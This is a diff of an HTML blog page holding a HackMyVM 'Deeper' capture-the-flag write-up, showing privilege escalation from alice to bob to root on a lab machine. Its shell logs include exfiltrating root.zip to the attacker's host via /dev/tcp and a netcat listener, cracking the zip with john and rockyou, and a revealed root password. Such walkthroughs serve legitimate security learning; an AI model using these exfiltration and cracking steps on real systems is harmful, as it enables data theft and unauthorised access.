@@ -316,7 +316,7 @@ uid=0(root) gid=0(root) groups=0(root)
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Deeper.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>hmv_Deeper</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -413,84 +413,83 @@ Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa"><img src="https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa" alt="Image" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1"><img src="https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1" alt="Image" style="max-width: 100%;"></a></p>
 <h1>3.提权</h1>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh alice@192.168.205.143                                             
-The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
-ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
-alice@192.168.205.143's password: 
-Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.143 (192.168.205.143)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.</span>
+<span class="pl-s">This key is not known by any other names.</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.205.143<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
+<span class="pl-s">alice@192.168.205.143<span class="pl-pds">'</span></span>s password: 
+Linux deeper 6.1.0-11-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64</span>
 
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
+The programs included with the Debian GNU/Linux system are free software<span class="pl-k">;</span>
+the exact distribution terms <span class="pl-k">for</span> <span class="pl-smi">each program are described</span> <span class="pl-k">in</span> the
+individual files <span class="pl-k">in</span> /usr/share/doc/<span class="pl-k">*</span>/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
-alice@deeper:~$ id
+alice@deeper:<span class="pl-k">~</span>$ id
 uid=1000(alice) gid=1000(alice) groups=1000(alice)
-alice@deeper:~$ sudo -l
-[sudo] password for alice: 
+alice@deeper:<span class="pl-k">~</span>$ sudo -l
+[sudo] password <span class="pl-k">for</span> alice: 
 Sorry, user alice may not run sudo on deeper.
-alice@deeper:~$ ls -la
+alice@deeper:<span class="pl-k">~</span>$ ls -la
 total 32
-drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
+drwxr--r-- 3 alice alice 4096 Aug 26  2023 <span class="pl-c1">.</span>
 drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
-lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
+lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -<span class="pl-k">&gt;</span> /dev/null
 -rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
 -rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
 -rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
 drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
 -rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
 -rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
-alice@deeper:~$ cat .bob.txt
+alice@deeper:<span class="pl-k">~</span>$ cat .bob.txt
 535746745247566c634556756233566e61413d3d
-
-</code></pre>
+</pre></div>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700"><img src="https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700" alt="Image" style="max-width: 100%;"></a></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">alice@deeper:/home$ su - bob
+<div class="highlight highlight-source-shell"><pre class="notranslate">alice@deeper:/home$ su - bob
 Password: 
-bob@deeper:~$ id
+bob@deeper:<span class="pl-k">~</span>$ id
 uid=1001(bob) gid=1001(bob) groups=1001(bob)
-bob@deeper:~$ sudo -l
-[sudo] password for bob: 
+bob@deeper:<span class="pl-k">~</span>$ sudo -l
+[sudo] password <span class="pl-k">for</span> bob: 
 Sorry, user bob may not run sudo on deeper.
-bob@deeper:~$ ls -la
+bob@deeper:<span class="pl-k">~</span>$ ls -la
 total 28
-drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
+drwxr--r-- 3 bob  bob  4096 Aug 26  2023 <span class="pl-c1">.</span>
 drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
-lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
+lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -<span class="pl-k">&gt;</span> /dev/null
 -rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
 -rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
 drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
 -rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
 -rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
-bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777
+bob@deeper:<span class="pl-k">~</span>$ cat root.zip <span class="pl-k">&gt;</span> /dev/tcp/192.168.205.141/7777
 
-#kali
+<span class="pl-c"><span class="pl-c">#</span>kali</span>
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ nc -lvnp 7777 &gt; root.zip 
+└─$ nc -lvnp 7777 <span class="pl-k">&gt;</span> root.zip 
 listening on [any] 7777 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                  
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ zip2john root.zip &gt; hash                          
+└─$ zip2john root.zip <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>                          
 ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                    
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> 
 Using default input encoding: UTF-8
-Loaded 1 password hash (PKZIP [32/64])
+Loaded 1 password <span class="pl-c1">hash</span> (PKZIP [32/64])
 No password hashes left to crack (see FAQ)
                                                                                                                                    
 ┌──(kali㉿kali)-[~/test/tmp]
-└─$ john --show hash                                  
+└─$ john --show <span class="pl-c1">hash</span>                                  
 root.zip/root.txt:bob:root.txt:root.zip::root.zip
 
-1 password hash cracked, 0 left                                              
+1 password <span class="pl-c1">hash</span> cracked, 0 left                                              
                                  
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ unzip root.zip
@@ -501,15 +500,13 @@ Archive:  root.zip
 ┌──(kali㉿kali)-[~/test/tmp]
 └─$ cat root.txt
 root:IhateMyPassword
-                                
-</code></pre>
+                                </pre></div>
 <p>登录root</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">bob@deeper:~$ su -
+<div class="highlight highlight-source-shell"><pre class="notranslate">bob@deeper:<span class="pl-k">~</span>$ su -
 Password: 
-root@deeper:~# id
+root@deeper:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=0(root) gid=0(root) groups=0(root)
-
-</code></pre></div>
+</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
